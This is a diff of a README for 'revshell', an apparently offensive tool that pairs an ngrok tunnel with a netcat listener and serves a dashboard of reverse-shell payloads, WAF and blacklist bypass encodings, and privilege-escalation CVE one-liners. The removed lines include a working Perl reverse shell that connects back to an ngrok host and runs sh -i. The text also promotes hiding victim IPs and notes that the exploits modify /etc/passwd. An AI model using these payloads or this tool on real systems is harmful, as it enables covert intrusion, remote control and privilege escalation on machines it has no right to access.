@@ -1,61 +1,33 @@
-# ███ REVSHELL ███
+<div align="center">
 
-**one-shot ngrok + netcat reverse shell listener with a live web dashboard**
+<img src="screenshots/dashboard.png" alt="revshell dashboard" width="900">
 
-```
- ██████╗ ███████╗██████╗ ██╗  ██╗██╗   ██╗███████╗██╗  ██╗
-██╔════╝ ██╔════╝██╔══██╗██║ ██╔╝██║   ██║██╔════╝╚██╗██╔╝
-██║  ███╗█████╗  ██████╔╝█████╔╝ ██║   ██║█████╗   ╚███╔╝
-██║   ██║██╔══╝  ██╔══██╗██╔═██╗ ██║   ██║██╔══╝   ██╔██╗
-╚██████╔╝███████╗██║  ██║██║  ██╗╚██████╔╝███████╗██╔╝ ██╗
- ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
-      author : madtiger    Telegram : DevidLuice    v2.2
-```
+# ⚡ REVSHELL
 
-`revshell` opens an **ngrok tcp tunnel** and a **netcat listener on the same random 4-digit port**, then serves a local **web dashboard** where every payload is generated with the live ngrok host/port and ready to copy in one click.
+### *one command → tunnel → listener → shell*
 
-## screenshot
+`revshell -tcp` opens an **ngrok tcp tunnel** + **netcat listener** on the same random 4-digit port,
+then serves a live **web dashboard** where every payload is generated with your real ngrok endpoint — ready to copy in one click.
 
-![revshell dashboard — monitor tab](screenshots/dashboard.png)
+<img src="https://img.shields.io/badge/python-3-00ff41?style=for-the-badge&logo=python&logoColor=white">
+<img src="https://img.shields.io/badge/dependencies-0-00ff41?style=for-the-badge">
+<img src="https://img.shields.io/badge/version-2.2-00e5ff?style=for-the-badge">
+<img src="https://img.shields.io/badge/author-madtiger-ff2e4d?style=for-the-badge">
+<img src="https://img.shields.io/badge/telegram-DevidLuice-00e5ff?style=for-the-badge&logo=telegram&logoColor=white">
 
-![revshell dashboard — payloads tab](screenshots/payloads.png)
+</div>
 
-![revshell dashboard — privesc CVE tab](screenshots/cves.png)
+---
 
-## features
-
-- **one command** — `revshell -tcp` does everything: random 4-digit port, ngrok tunnel, `nc -lnvp`, dashboard
-- **web dashboard** (`127.0.0.1`) — matrix rain, CRT scanlines, glitch logo, live status cards
-- **live monitor** — sessions opened/closed in real time, uptime, shells caught, listener state
-- **payload arsenal** — 33 payloads in 4 sections, auto-filled with your live ngrok endpoint:
-  - `basic` — perl, bash, python, php, nc (-e / no -e), ruby, socat, powershell
-  - `encoded` — base64, double-base64, hex pipeline, url-encoded, powershell -enc
-  - `bypass` — `${IFS}` space bypass, quote/slash stripping, keyword blacklists (`$0`), mkfifo nc relay
-  - `cve` — public privesc one-liners: **PwnKit** (CVE-2021-4034), **DirtyPipe** (CVE-2022-0847), **DirtyCOW** (CVE-2016-5195), **DirtyFrag** (CVE-2026-43284 + CVE-2026-43500) + a recon one-liner to pick the right one
-- **one-click copy** — copy button on every card, or click anywhere on a command
-- **clean terminal** — banner, tunnel, `listening >>>>>`, then your shell. nothing else
-- **safe teardown** — session end, `Ctrl+C`, `SIGTERM` or `SIGHUP` all tear down ngrok + nc, no orphans
-- single file · python 3 stdlib only · no dependencies
-
-## install
+## ⚡ quick start
 
 ```bash
-sudo cp revshell.py /usr/local/bin/revshell
-sudo chmod +x /usr/local/bin/revshell
+# install
+sudo cp revshell.py /usr/local/bin/revshell && sudo chmod +x /usr/local/bin/revshell
+
+# fire
+revshell -tcp
 ```
-
-requires: `ngrok` (authenticated), `nc`/`ncat`
-
-## usage
-
-```bash
-revshell -tcp                # random 4-digit port + dashboard auto-opens
-revshell -tcp -p 4444        # fixed local port
-revshell -tcp --no-browser   # don't auto-open the dashboard
-revshell -tcp --web 8080     # fixed dashboard port
-```
-
-terminal output stays minimal:
 
 ```
 [+] tunnel up    : 0.tcp.in.ngrok.io:11044 → 127.0.0.1:1337
@@ -68,22 +40,76 @@ terminal output stays minimal:
 Listening on 0.0.0.0 1337
 ```
 
-fire a payload on the target — the shell lands in your terminal and the dashboard feed logs the session:
-
-```bash
-perl -e 'use Socket;$i="0.tcp.in.ngrok.io";$p=11044;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
-```
-
-## notes
-
-- victim IPs are hidden behind the ngrok edge — the dashboard tracks sessions via the local relay
-- the dashboard binds `127.0.0.1` only
-- privesc CVE one-liners pull public PoCs from their original repos — check the affected versions on each card before firing
-
-## legal
-
-for **authorized** use only — your own labs, CTFs, and engagements you have permission to test. the privesc exploits modify page cache and `/etc/passwd` on live systems.
+terminal stays clean. the shell lands in your terminal — sessions, payloads and CVEs live in the dashboard.
 
 ---
 
-**author** : madtiger · **Telegram** : DevidLuice
+## 🕸️ dashboard
+
+| tab | what you get |
+|---|---|
+| `MONITOR` | live status cards · tunnel / ports / state / shells caught · real-time session feed |
+| `PAYLOADS` | 28 reverse-shell cards — **basic · encoded · bypass** — one-click copy, auto-filled with your live endpoint |
+| `CVE` | public privesc one-liners with affected versions + a recon command to pick the right one |
+
+<details>
+<summary><b>📸 payloads tab</b></summary>
+<img src="screenshots/payloads.png" alt="payloads tab">
+</details>
+
+<details>
+<summary><b>📸 privesc CVE tab</b></summary>
+<img src="screenshots/cves.png" alt="cve tab">
+</details>
+
+matrix rain · CRT scanlines · glitch logo · blinking cursor — full hacker aesthetic, served on `127.0.0.1` only.
+
+---
+
+## 💉 payload arsenal
+
+| section | payloads |
+|---|---|
+| **basic** | perl · bash `/dev/tcp` · python · php · nc (`-e` + mkfifo no-`-e`) · ruby · socat · powershell |
+| **encoded** | base64 (bash/python/perl) · **double base64** for WAFs that decode once · hex via `xxd` · url-encoded for GET params · `powershell -enc` |
+| **bypass** | spaces blocked → `${IFS}` · quotes/slashes stripped → base64 wrap · `sh`/`bash` blacklisted → `$0` · openbsd nc → mkfifo relay |
+| **cve** | **PwnKit** `CVE-2021-4034` · **DirtyPipe** `CVE-2022-0847` · **DirtyCOW** `CVE-2016-5195` · **DirtyFrag** `CVE-2026-43284`+`CVE-2026-43500` |
+
+every card = one click to clipboard. click anywhere on a command copies it too.
+
+---
+
+## 🧰 usage
+
+```bash
+revshell -tcp                  # random 4-digit port + dashboard auto-opens
+revshell -tcp -p 4444          # fixed local port
+revshell -tcp --no-browser     # don't auto-open the dashboard
+revshell -tcp --web 8080       # fixed dashboard port
+```
+
+<details>
+<summary>requirements & teardown</summary>
+
+- `ngrok` authenticated + `nc`/`ncat` on PATH
+- teardown is safe on every exit path — session end, `Ctrl+C`, `SIGTERM`, `SIGHUP` — ngrok + netcat never get orphaned
+- victim IPs stay hidden behind the ngrok edge; the monitor tracks sessions via the local relay
+
+</details>
+
+---
+
+<div align="center">
+
+## ⚠️ authorized use only
+
+**your labs · your CTFs · your engagements**
+
+the privesc exploits modify page cache and `/etc/passwd` on live systems —
+check affected versions on each card before firing.
+
+---
+
+**`revshell`** · crafted by **madtiger** · `Telegram : DevidLuice`
+
+</div>
